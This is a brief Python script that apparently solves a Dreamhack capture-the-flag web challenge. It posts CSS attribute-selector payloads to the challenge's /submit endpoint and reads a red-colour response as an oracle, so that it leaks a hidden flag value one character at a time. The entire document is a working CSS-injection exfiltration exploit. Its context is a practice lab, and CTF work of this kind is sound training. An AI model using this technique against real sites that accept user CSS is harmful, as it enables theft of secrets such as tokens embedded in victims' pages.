import requests
import string

url = 'http://host3.dreamhack.games:9306/'
s = requests.Session()

charset = '_}' + string.ascii_letters + string.digits

flag = 'DH{y0u'

while not flag.endswith('}'):
    for char in charset:
        print("Trying:", char, '|', flag)

        payload = '''#flag[value^="%s"] + #oracle { background:red; }''' % (flag + char)

        res = s.post(f"{url}/submit", data={
            'css': payload
        })

        if '<strong>red</strong>' in res.text:
            flag += char
            break

print("Flag:", flag)